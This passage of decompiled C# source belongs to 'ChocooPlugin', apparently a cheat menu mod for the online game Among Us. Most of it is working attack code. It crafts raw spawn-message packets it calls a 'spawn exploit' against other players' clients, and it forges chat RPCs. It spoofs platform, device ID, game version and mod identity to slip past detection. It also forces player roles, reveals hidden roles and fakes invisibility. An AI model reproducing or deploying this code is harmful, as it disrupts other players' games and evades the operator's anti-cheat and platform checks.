      Color rgb3 = Color.HSVToRGB(ChocooPlugin.rgbHue, 0.4f * ChocooPlugin.breatheIntensity, 0.9f * ChocooPlugin.breatheIntensity);
      rgb3.a = 1f;
      ChocooPlugin._cachedRGBText = rgb3;
    }
    return ChocooPlugin._cachedRGBColor;
  }

  public static Color GetRGBAccent()
  {
    return !ChocooPlugin.RGBMode ? new Color(0.15f, 0.15f, 0.2f, 1f) : ChocooPlugin._cachedRGBAccent;
  }

  public static Color GetRGBText()
  {
    return !ChocooPlugin.RGBMode ? Color.white : ChocooPlugin._cachedRGBText;
  }

  private static void UpdateRGBBreathing()
  {
    if (ChocooPlugin.breatheIncreasing)
    {
      ChocooPlugin.breatheIntensity += Time.deltaTime * 0.8f;
      if ((double) ChocooPlugin.breatheIntensity >= 1.0)
      {
        ChocooPlugin.breatheIntensity = 1f;
        ChocooPlugin.breatheIncreasing = false;
      }
    }
    else
    {
      ChocooPlugin.breatheIntensity -= Time.deltaTime * 0.8f;
      if ((double) ChocooPlugin.breatheIntensity <= 0.30000001192092896)
      {
        ChocooPlugin.breatheIntensity = 0.3f;
        ChocooPlugin.breatheIncreasing = true;
        ChocooPlugin.currentHueTarget += 0.15f;
        if ((double) ChocooPlugin.currentHueTarget > 1.0)
          ChocooPlugin.currentHueTarget = 0.0f;
      }
    }
    ChocooPlugin.rgbHue = Mathf.Lerp(ChocooPlugin.rgbHue, ChocooPlugin.currentHueTarget, Time.deltaTime * 2f);
  }

  public static void RefreshAllPlayerNametags()
  {
    // ISSUE: unable to decompile the method.
  }

  public static float GetDropdownHeight(string prefix, bool isOpen, float maxVisibleHeight)
  {
    return !isOpen ? 25f : maxVisibleHeight;
  }

  public static void TrackOwnModUsage()
  {
    try
    {
      if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
        return;
      byte playerId = PlayerControl.LocalPlayer.PlayerId;
      if (!ChocooPlugin.SeeModUsersEnabled)
      {
        if (!ChocooPlugin.detectedModUsers.ContainsKey(playerId))
          return;
        ChocooPlugin.detectedModUsers.Remove(playerId);
      }
      else if (ChocooPlugin.StealthMode)
      {
        if (!ChocooPlugin.detectedModUsers.ContainsKey(playerId))
          return;
        ChocooPlugin.detectedModUsers.Remove(playerId);
      }
      else
      {
        byte num = ChocooPlugin.SpoofMenuEnabled ? ChocooPlugin.spoofMenuRPCs[ChocooPlugin.selectedSpoofMenuIndex] : (byte) 121;
        ChocooPlugin.detectedModUsers[playerId] = num;
      }
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("TrackOwnModUsage error: " + ex.Message));
    }
  }

  public static void BroadcastMenuIdentification()
  {
    try
    {
      if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || ChocooPlugin.StealthMode)
        return;
      byte num = ChocooPlugin.SpoofMenuEnabled ? ChocooPlugin.spoofMenuRPCs[ChocooPlugin.selectedSpoofMenuIndex] : (byte) 121;
      MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, num, (SendOption) 1, -1);
      switch (num)
      {
        case 121:
          messageWriter.Write("CHOCOO_PING");
          break;
        case 202:
          messageWriter.Write("MMC_v5");
          messageWriter.Write(PlayerControl.LocalPlayer.PlayerId);
          messageWriter.Write("6.0.0");
          break;
      }
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
      string str = ChocooPlugin.SpoofMenuEnabled ? ChocooPlugin.spoofMenuNames[ChocooPlugin.selectedSpoofMenuIndex] : "ChocooMenu";
      ChocooPlugin.Logger.LogInfo((object) $"[Menu Identification] Sent as: {str} (RPC {num.ToString()})");
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("BroadcastMenuIdentification error: " + ex.Message));
    }
  }

  public static void SendWeirdQuickChat()
  {
    try
    {
      if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
        return;
      int index = Random.Range(0, ChocooPlugin.weirdMessages.Length);
      string str = ChocooPlugin.weirdMessages[index];
      if (str.Length >= 100)
        str = str.Substring(0, 99);
      PlayerControl.LocalPlayer.RpcSendChat(str);
      ChocooPlugin.Logger.LogInfo((object) $"Sent random weird chat #{index.ToString()}: {str}");
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("Send Weird Chat error: " + ex.Message));
    }
  }

  public static void ApplyForcedRoles()
  {
    try
    {
      if (!((InnerNetClient) AmongUsClient.Instance).AmHost || ChocooPlugin.forcedRoles.Count == 0)
        return;
      foreach (KeyValuePair<int, RoleTypes> forcedRole in ChocooPlugin.forcedRoles)
      {
        int playerId = forcedRole.Key;
        RoleTypes roleTypes = forcedRole.Value;
        PlayerControl playerControl = ((IEnumerable<PlayerControl>) PlayerControl.AllPlayerControls.ToArray()).FirstOrDefault<PlayerControl>((Func<PlayerControl, bool>) (p => Object.op_Inequality((Object) p, (Object) null) && (int) p.PlayerId == playerId));
        if (Object.op_Inequality((Object) playerControl, (Object) null) && Object.op_Inequality((Object) playerControl.Data, (Object) null))
        {
          playerControl.RpcSetRole(roleTypes, true);
          ChocooPlugin.Logger.LogInfo((object) $"✓ Forced {playerControl.Data.PlayerName} to role: {roleTypes.ToString()}");
        }
      }
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("ApplyForcedRoles error: " + ex.Message));
    }
  }

  public static bool InjectSpawnExploitToAllPlayers()
  {
    if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost)
      return false;
    for (int index = 0; index < 2; ++index)
    {
      try
      {
        MessageWriter messageWriter = MessageWriter.Get((SendOption) 1);
        messageWriter.StartMessage((byte) 6);
        messageWriter.Write(((InnerNetClient) AmongUsClient.Instance).GameId);
        messageWriter.WritePacked(-1);
        foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
        {
          if (!Object.op_Equality((Object) playerControl, (Object) null))
          {
            messageWriter.StartMessage((byte) 4);
            messageWriter.WritePacked(69420U);
            messageWriter.WritePacked(((InnerNetObject) playerControl).OwnerId);
            messageWriter.Write((byte) 0);
            messageWriter.WritePacked(1);
            messageWriter.WritePacked(((InnerNetObject) playerControl).NetId);
            messageWriter.StartMessage((byte) 1);
            messageWriter.EndMessage();
            messageWriter.EndMessage();
          }
        }
        messageWriter.EndMessage();
        ((Connection) ((InnerNetClient) AmongUsClient.Instance).connection).Send(messageWriter);
        messageWriter.Recycle();
        return true;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogWarning((object) $"Spawn exploit attempt {(index + 1).ToString()} failed: {ex.Message}");
      }
    }
    return false;
  }

  public static bool InjectSpawnExploitTo(PlayerControl target)
  {
    if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || !((InnerNetClient) AmongUsClient.Instance).AmHost || Object.op_Equality((Object) target, (Object) null))
      return false;
    for (int index = 0; index < 2; ++index)
    {
      try
      {
        MessageWriter messageWriter = MessageWriter.Get((SendOption) 1);
        messageWriter.StartMessage((byte) 6);
        messageWriter.Write(((InnerNetClient) AmongUsClient.Instance).GameId);
        messageWriter.WritePacked(-1);
        messageWriter.StartMessage((byte) 4);
        messageWriter.WritePacked(69420U);
        messageWriter.WritePacked(((InnerNetObject) target).OwnerId);
        messageWriter.Write((byte) 0);
        messageWriter.WritePacked(1);
        messageWriter.WritePacked(((InnerNetObject) target).NetId);
        messageWriter.StartMessage((byte) 1);
        messageWriter.EndMessage();
        messageWriter.EndMessage();
        messageWriter.EndMessage();
        ((Connection) ((InnerNetClient) AmongUsClient.Instance).connection).Send(messageWriter);
        messageWriter.Recycle();
        return true;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogWarning((object) $"Spawn exploit attempt {(index + 1).ToString()} failed: {ex.Message}");
      }
    }
    return false;
  }

  public static void LoadBlacklist()
  {
    try
    {
      string path = Path.Combine(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "..", "..", ".."), "blacklist.txt");
      ChocooPlugin.blacklistFolderPath = path;
      if (!File.Exists(path))
        return;
      foreach (string readAllLine in File.ReadAllLines(path))
      {
        string str = readAllLine.Trim();
        if (!string.IsNullOrEmpty(str))
          ChocooPlugin.BlacklistedCodes.Add(str.ToLower());
      }
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("LoadBlacklist error: " + ex.Message));
    }
  }

  public static void SaveToBlacklist(string friendCode)
  {
    try
    {
      if (string.IsNullOrWhiteSpace(friendCode))
        return;
      friendCode = friendCode.Trim().ToLower();
      if (ChocooPlugin.BlacklistedCodes.Contains(friendCode))
        return;
      ChocooPlugin.BlacklistedCodes.Add(friendCode);
      File.AppendAllText(ChocooPlugin.blacklistFolderPath, friendCode + Environment.NewLine);
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("SaveToBlacklist error: " + ex.Message));
    }
  }

  public static void RemoveFromBlacklist(string friendCode)
  {
    try
    {
      if (string.IsNullOrWhiteSpace(friendCode))
        return;
      friendCode = friendCode.Trim().ToLower();
      ChocooPlugin.BlacklistedCodes.Remove(friendCode);
      if (!File.Exists(ChocooPlugin.blacklistFolderPath))
        return;
      List<string> stringList = new List<string>((IEnumerable<string>) File.ReadAllLines(ChocooPlugin.blacklistFolderPath));
      stringList.RemoveAll((Predicate<string>) (l => l.Trim().ToLower() == friendCode));
      File.WriteAllLines(ChocooPlugin.blacklistFolderPath, stringList.ToArray());
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("RemoveFromBlacklist error: " + ex.Message));
    }
  }

  public static bool IsPlayerBlacklisted(PlayerControl player)
  {
    try
    {
      if (Object.op_Equality((Object) player, (Object) null) || Object.op_Equality((Object) player.Data, (Object) null))
        return false;
      string str = "";
      try
      {
        str = player.FriendCode;
      }
      catch
      {
      }
      if (string.IsNullOrEmpty(str))
      {
        try
        {
          str = player.Data.FriendCode;
        }
        catch
        {
        }
      }
      if (string.IsNullOrEmpty(str) && Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null))
      {
        try
        {
          ClientData client = ((InnerNetClient) AmongUsClient.Instance).GetClient(player.Data.ClientId);
          if (client != null)
            str = client.FriendCode;
        }
        catch
        {
        }
      }
      return !string.IsNullOrEmpty(str) && ChocooPlugin.BlacklistedCodes.Contains(str.ToLower().Trim());
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("IsPlayerBlacklisted error: " + ex.Message));
      return false;
    }
  }

  private static void ApplyButtonColor(GameObject go, params string[] avoidNames)
  {
    if (Object.op_Equality((Object) go, (Object) null) || !ChocooPlugin.CustomButtonColorEnabled)
      return;
    foreach (SpriteRenderer componentsInChild in go.GetComponentsInChildren<SpriteRenderer>(true))
    {
      if (!Object.op_Equality((Object) componentsInChild, (Object) null))
      {
        bool flag = false;
        if (avoidNames != null)
        {
          foreach (string avoidName in avoidNames)
          {
            if (((Object) ((Component) componentsInChild).gameObject).name == avoidName)
            {
              flag = true;
              break;
            }
          }
        }
        if (!flag)
          componentsInChild.color = ChocooPlugin.customButtonColor;
      }
    }
  }

  public static void SendColouredChat()
  {
    try
    {
      if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
        return;
      int num = Random.Range(0, 10);
      switch (num)
      {
        case 0:
          ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 1912);
          break;
        case 1:
          ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 197);
          break;
        case 2:
          ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 198);
          break;
        case 3:
          ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 1913);
          break;
        case 4:
          ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 1914);
          break;
        case 5:
          ChocooPlugin.SendQuickChatMega3();
          break;
        case 6:
          ChocooPlugin.SendQuickChatMega4();
          break;
        case 7:
          ChocooPlugin.SendQuickChatMega5();
          break;
        case 8:
          ChocooPlugin.SendQuickChatMega6();
          break;
        case 9:
          ChocooPlugin.SendQuickChatMega8();
          break;
        default:
          ChocooPlugin.SendQuickChatRaw((byte) 3, (ushort) 78, (byte) 1, (byte) 2, (ushort) 1912);
          break;
      }
      ChocooPlugin.Logger.LogInfo((object) $"Sent colored chat (random choice: {num.ToString()})");
      ++ChocooPlugin.coloredChatIndex;
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("Send Coloured Chat error: " + ex.Message));
    }
  }

  public static void SendQuickChatRaw(byte msg1, ushort msg2, byte msg3, byte msg4, ushort msg7)
  {
    try
    {
      MessageWriter messageWriter1 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, -1);
      messageWriter1.Write(msg1);
      messageWriter1.Write(msg2);
      messageWriter1.Write(msg3);
      messageWriter1.Write(msg4);
      messageWriter1.Write(msg7);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter1);
      MessageWriter messageWriter2 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, ((InnerNetObject) PlayerControl.LocalPlayer).OwnerId);
      messageWriter2.Write(msg1);
      messageWriter2.Write(msg2);
      messageWriter2.Write(msg3);
      messageWriter2.Write(msg4);
      messageWriter2.Write(msg7);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter2);
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("SendQuickChatRaw error: " + ex.Message));
    }
  }

  public static void SendQuickChatMega3()
  {
    try
    {
      MessageWriter messageWriter1 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, -1);
      messageWriter1.Write((byte) 3);
      messageWriter1.Write((ushort) 78);
      messageWriter1.Write((byte) 3);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1912);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 197);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 198);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter1);
      MessageWriter messageWriter2 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, ((InnerNetObject) PlayerControl.LocalPlayer).OwnerId);
      messageWriter2.Write((byte) 3);
      messageWriter2.Write((ushort) 78);
      messageWriter2.Write((byte) 3);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1912);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 197);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 198);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter2);
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("SendQuickChatMega3 error: " + ex.Message));
    }
  }

  public static void SendQuickChatMega4()
  {
    try
    {
      MessageWriter messageWriter1 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, -1);
      messageWriter1.Write((byte) 3);
      messageWriter1.Write((ushort) 78);
      messageWriter1.Write((byte) 4);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1912);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 197);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 198);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1913);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter1);
      MessageWriter messageWriter2 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, ((InnerNetObject) PlayerControl.LocalPlayer).OwnerId);
      messageWriter2.Write((byte) 3);
      messageWriter2.Write((ushort) 78);
      messageWriter2.Write((byte) 4);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1912);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 197);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 198);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1913);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter2);
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("SendQuickChatMega4 error: " + ex.Message));
    }
  }

  public static void SendQuickChatMega5()
  {
    try
    {
      MessageWriter messageWriter1 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, -1);
      messageWriter1.Write((byte) 3);
      messageWriter1.Write((ushort) 78);
      messageWriter1.Write((byte) 5);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1912);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 197);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 198);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1913);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1914);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter1);
      MessageWriter messageWriter2 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, ((InnerNetObject) PlayerControl.LocalPlayer).OwnerId);
      messageWriter2.Write((byte) 3);
      messageWriter2.Write((ushort) 78);
      messageWriter2.Write((byte) 5);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1912);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 197);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 198);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1913);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1914);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter2);
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("SendQuickChatMega5 error: " + ex.Message));
    }
  }

  public static void SendQuickChatMega6()
  {
    try
    {
      MessageWriter messageWriter1 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, -1);
      messageWriter1.Write((byte) 3);
      messageWriter1.Write((ushort) 78);
      messageWriter1.Write((byte) 6);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1912);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 197);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 198);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1913);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1914);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1915);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter1);
      MessageWriter messageWriter2 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, ((InnerNetObject) PlayerControl.LocalPlayer).OwnerId);
      messageWriter2.Write((byte) 3);
      messageWriter2.Write((ushort) 78);
      messageWriter2.Write((byte) 6);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1912);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 197);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 198);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1913);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1914);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1915);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter2);
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("SendQuickChatMega6 error: " + ex.Message));
    }
  }

  public static void SendQuickChatMega8()
  {
    try
    {
      MessageWriter messageWriter1 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, -1);
      messageWriter1.Write((byte) 3);
      messageWriter1.Write((ushort) 78);
      messageWriter1.Write((byte) 8);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1912);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 197);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 198);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1913);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1914);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1915);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 1912);
      messageWriter1.Write((byte) 2);
      messageWriter1.Write((ushort) 197);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter1);
      MessageWriter messageWriter2 = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer).NetId, (byte) 33, (SendOption) 1, ((InnerNetObject) PlayerControl.LocalPlayer).OwnerId);
      messageWriter2.Write((byte) 3);
      messageWriter2.Write((ushort) 78);
      messageWriter2.Write((byte) 8);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1912);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 197);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 198);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1913);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1914);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1915);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 1912);
      messageWriter2.Write((byte) 2);
      messageWriter2.Write((ushort) 197);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter2);
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("SendQuickChatMega8 error: " + ex.Message));
    }
  }

  public static bool IsInMeetingGracePeriod()
  {
    if (!ChocooPlugin.isMeetingActive)
    {
      if ((double) (Time.time - ChocooPlugin.currentMeetingEndTime) < 0.5)
        return true;
    }
    else if ((double) (Time.time - ChocooPlugin.currentMeetingStartTime) < 0.5 || ChocooPlugin.votingHasCompleted && (double) (Time.time - ChocooPlugin.votingCompleteTime) < 5.0)
      return true;
    return false;
  }

  private static void ToggleInvisibility()
  {
    try
    {
      if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Equality((Object) PlayerControl.LocalPlayer.NetTransform, (Object) null))
        return;
      CustomNetworkTransform netTransform = PlayerControl.LocalPlayer.NetTransform;
      ushort num = ++netTransform.lastSequenceId;
      MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) netTransform).NetId, (byte) 21, (SendOption) 1, -1);
      if (ChocooPlugin.InvisibilityEnabled)
        NetHelpers.WriteVector2(new Vector2(-121f, -121f), messageWriter);
      else
        NetHelpers.WriteVector2(netTransform.body.position, messageWriter);
      messageWriter.Write(num);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
      ChocooPlugin.Logger.LogInfo((object) ("Invisibility " + (ChocooPlugin.InvisibilityEnabled ? "enabled" : "disabled")));
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("ToggleInvisibility error: " + ex.Message));
    }
  }

  [HarmonyPatch(typeof (PlatformSpecificData), "Serialize")]
  public static class PlatformSpoofPatch
  {
    [HarmonyPrefix]
    public static void Prefix(PlatformSpecificData __instance)
    {
      if (string.IsNullOrEmpty(ChocooPlugin.SpoofedPlatform))
        return;
      if (ChocooPlugin.SpoofedPlatform.StartsWith("__custom:"))
      {
        string str = ChocooPlugin.SpoofedPlatform.Substring(9);
        __instance.PlatformName = str;
      }
      else
      {
        Platforms platform;
        if (ChocooPlugin.PlatformSpoofPatch.TryParsePlatform(ChocooPlugin.SpoofedPlatform, out platform))
        {
          __instance.Platform = platform;
          if (ChocooPlugin.BypassPlatformDetectionEnabled)
          {
            switch (platform - 1)
            {
              case 0:
              case 1:
              case 2:
              case 4:
              case 5:
              case 6:
                __instance.PlatformName = "TESTNAME";
                __instance.XboxPlatformId = 0UL;
                __instance.PsnPlatformId = 0UL;
                break;
              case 3:
                __instance.PlatformName = "TESTNAME";
                __instance.XboxPlatformId = 2849571630UL;
                __instance.PsnPlatformId = 0UL;
                break;
              case 7:
                __instance.PlatformName = "NintendoFan";
                __instance.XboxPlatformId = 0UL;
                __instance.PsnPlatformId = 0UL;
                break;
              case 8:
                __instance.PlatformName = "ProGamer2024";
                __instance.XboxPlatformId = 7394826105UL;
                __instance.PsnPlatformId = 0UL;
                break;
              case 9:
                __instance.PlatformName = "SkullCrusher";
                __instance.XboxPlatformId = 0UL;
                __instance.PsnPlatformId = 4682137590UL;
                break;
            }
          }
        }
      }
    }

    private static bool TryParsePlatform(string platformString, out Platforms platform)
    {
      if (platformString.Equals("Starlight", StringComparison.OrdinalIgnoreCase))
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref platform = 112 /*0x70*/;
        return true;
      }
      if (!platformString.StartsWith("__custom:"))
        return Enum.TryParse<Platforms>(platformString, true, out platform);
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref platform = 0;
      return false;
    }
  }

  [HarmonyPatch]
  public static class DeviceIdSpoofPatch
  {
    public static void Postfix(ref string __result)
    {
      if (!ChocooPlugin.SpoofDeviceIdEnabled)
        return;
      if (string.IsNullOrEmpty(ChocooPlugin.spoofedDeviceId))
      {
        byte[] data = new byte[16 /*0x10*/];
        using (RandomNumberGenerator randomNumberGenerator = RandomNumberGenerator.Create())
          randomNumberGenerator.GetBytes(data);
        ChocooPlugin.spoofedDeviceId = BitConverter.ToString(data).Replace("-", "").ToLower();
      }
      __result = ChocooPlugin.spoofedDeviceId;
    }
  }

  [HarmonyPatch(typeof (Constants), "GetBroadcastVersion")]
  public static class GameVersionSpoofPatch
  {
    public static bool Prefix(ref int __result)
    {
      if (!ChocooPlugin.SpoofGameVersionEnabled || !Object.op_Implicit((Object) AmongUsClient.Instance) || ((InnerNetClient) AmongUsClient.Instance).NetworkMode != 1)
        return true;
      __result = ChocooPlugin.SpoofedGameVersion;
      if (ChocooPlugin.UseModdedProtocol)
        __result += 25;
      return false;
    }
  }

  [HarmonyPatch(typeof (Constants), "IsVersionModded")]
  public static class MarkVersionModdedPatch
  {
    public static bool Prefix(ref bool __result)
    {
      if (!ChocooPlugin.SpoofGameVersionEnabled || !ChocooPlugin.UseModdedProtocol)
        return true;
      __result = true;
      return false;
    }
  }

  [HarmonyPatch(typeof (MeetingHud), "Start")]
  public static class MeetingHud_RevealRolesPatch
  {
    [HarmonyPostfix]
    public static void Postfix(MeetingHud __instance)
    {
      if (!ChocooPlugin.SeeRolesEnabled && !ChocooPlugin.ShowPlayerInfo)
        return;
      try
      {
        foreach (PlayerVoteArea playerState in (Il2CppArrayBase<PlayerVoteArea>) __instance.playerStates)
        {
          if (!Object.op_Equality((Object) playerState, (Object) null))
          {
            NetworkedPlayerInfo playerById = GameData.Instance.GetPlayerById(playerState.TargetPlayerId);
            if (!Object.op_Equality((Object) playerById, (Object) null) && !playerById.Disconnected && !Object.op_Equality((Object) playerById.Role, (Object) null))
            {
              TextMeshPro nameText = playerState.NameText;
              if (!Object.op_Equality((Object) nameText, (Object) null))
              {
                string str1 = playerById.PlayerName ?? "";
                string htmlStringRgb = ColorUtility.ToHtmlStringRGB(playerById.Role.TeamColor);
                string roleName = ChocooPlugin.PlayerNametagsPatch.GetRoleName(playerById);
                string str2 = "";
                if (ChocooPlugin.SeeRolesEnabled)
                  str2 = $"<color=#{htmlStringRgb}>{roleName}</color>\n{str1}";
                ((TMP_Text) nameText).text = str2;
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("MeetingHud RevealRoles error: " + ex.Message));
      }
    }
  }

  [HarmonyPatch(typeof (PlayerControl), "RpcSetScanner")]
  public static class SetScannerPatch
  {
    [HarmonyPrefix]
    public static bool Prefix(PlayerControl __instance, bool value)
    {
      if ((int) __instance.PlayerId != (int) PlayerControl.LocalPlayer.PlayerId || !ChocooPlugin.IsScanning)
        return true;
      MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) __instance).NetId, (byte) 15, (SendOption) 1, -1);
      messageWriter.Write(value);
      messageWriter.Write(__instance.PlayerId);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
      __instance.SetScanner(value, __instance.PlayerId);
      return false;
    }
  }

  public static class LobbyTimerTracker
  {
    public static long TimerStartTS;
    private const float LOBBY_DURATION = 600f;

    public static float GetRemainingTime()
    {
